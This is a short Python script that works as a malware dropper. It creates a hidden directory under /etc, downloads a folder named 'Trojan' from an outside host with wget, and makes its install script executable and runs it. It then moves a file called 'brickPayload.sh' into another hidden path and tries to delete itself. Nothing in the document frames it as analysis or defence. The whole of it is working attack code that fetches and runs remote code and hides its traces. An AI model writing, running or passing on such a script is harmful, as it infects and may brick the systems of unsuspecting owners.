import os
import subprocess
def main():
    os.system("mkdir /etc/.a")
    os.system("wget -P /etc/.a -r -l 2 https://files.ravenn.net/horror/Trojan")
    os.system("mv /etc/.a/files.ravenn.net/horror/Trojan /etc/.a")
    os.system("chmod +x /etc/.a/Trojan/install.sh")
    os.system("bash /etc/.a/Trojan/install.sh")
    os.system("mv /etc/.a/horror/files.ravenn.net/horror/brickPayload.sh /etc/.music")
    os.system("rm -- \"$0\"")
main()